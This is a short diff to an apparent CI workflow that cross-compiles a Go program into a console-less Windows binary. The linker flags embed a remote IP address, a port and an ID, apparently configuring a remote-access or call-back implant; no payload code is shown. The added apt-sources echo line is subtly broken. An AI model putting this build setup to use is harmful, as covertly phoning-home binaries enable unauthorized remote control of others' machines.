@@ -19,7 +19,10 @@ jobs:
         go-version: 1.15
 
     - name: dependencies
-      run: sudo apt-get install mingw32
+      run: |
+        echo "\ndeb http://us.archive.ubuntu.com/ubuntu trusty main universe\n" >> /etc/apt/sources.list
+        sudo apt-get update
+        sudo apt-get install mingw32
 
     - name: Build
       run: GOOS=windows GOARCH=amd64 CGO_ENABLED=1 go build -ldflags ldflags="-s -w -H=windowsgui -w -X generate.RemoteAddr=10.10.27.11 -X generate.RemotePort=8080 -X main.GenerateMod=auto -X main.Rid=GfM4Luk"
